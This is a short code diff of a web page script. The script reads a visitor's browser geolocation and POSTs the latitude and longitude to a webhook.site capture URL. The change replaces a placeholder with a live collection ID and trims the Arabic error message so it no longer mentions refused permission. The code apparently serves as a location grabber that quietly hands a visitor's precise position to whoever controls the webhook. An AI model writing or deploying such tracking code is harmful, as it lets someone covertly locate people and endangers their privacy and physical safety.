@@ -20,7 +20,7 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+            fetch('https://webhook.site/e3ddf544-2bb7-43eb-b04e-b38cc43600b8', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ latitude: lat, longitude: lon })
@@ -30,7 +30,7 @@
         }
 
         function showError(error) {
-            console.log("حدث خطأ أو تم رفض الإذن: " + error.message);
+            console.log("حدث خطأ: " + error.message);
         }
     </script>
 </body>
